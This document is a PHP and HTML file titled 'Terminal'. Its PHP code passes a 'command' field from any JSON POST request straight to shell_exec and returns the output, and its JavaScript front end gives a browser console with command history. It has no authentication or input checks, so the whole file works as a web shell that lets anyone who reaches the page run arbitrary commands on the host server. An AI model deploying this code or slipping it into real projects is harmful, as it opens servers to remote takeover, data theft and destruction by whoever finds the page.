<?php
$req = json_decode(file_get_contents('php://input', true));

function json_output($output) {
    header('Content-Type: application/json');
    echo json_encode($output);
}

if(isset($req->command)) {
    $res = shell_exec("export HOME='/home/ibad' && {$req->command} 2>&1");

    return json_output(['output' => $res]);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal</title>
</head>
<body>
    <div id="output"></div>
    <input type="text" name="command" id="command" autocomplete="off" autofocus>

    <script>
        var historyIndex = -1;
        const command = document.getElementById('command');
        const output = document.getElementById('output');
        const url = document.location.href;

        const hitCommand = () => {
            fetch(url, {
                method: 'POST',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({command: command.value})
            })
            .then(res => res.json())
            .then(body => {
                const p = document.createElement('p');
                p.innerText = body.output;

                output.appendChild(p);
            });
        }

        function addHistory(history) {
            const histories = JSON.parse(sessionStorage.getItem('history')) || [];
            histories.unshift(history);

            sessionStorage.setItem('history', JSON.stringify(histories));
        }

        function getHistory(direction) {
            const histories = JSON.parse(sessionStorage.getItem('history')) || [];
            const total = histories.length;

            if(direction == 'up') {
                if(window.historyIndex + 1 < histories.length) window.historyIndex++;

                const history = histories[window.historyIndex];
                return history;
            }

            if(direction == 'down') {
                if(window.historyIndex < 0) return '';

                const history = histories[--window.historyIndex] || '';
                return history;
            }
        }

        command.addEventListener('keypress', function(e) {
            if(e.key == 'Enter') {
                if(this.value == 'clear') {
                    output.innerHTML = '';
                } else {
                    hitCommand();
                }

                addHistory(this.value);
                command.value = '';
            }
        });

        command.addEventListener('keydown', function(e) {
            if(e.key == 'ArrowUp') command.value = getHistory('up');
            if(e.key == 'ArrowDown') command.value = getHistory('down');
        });
    </script>
</body>
</html>
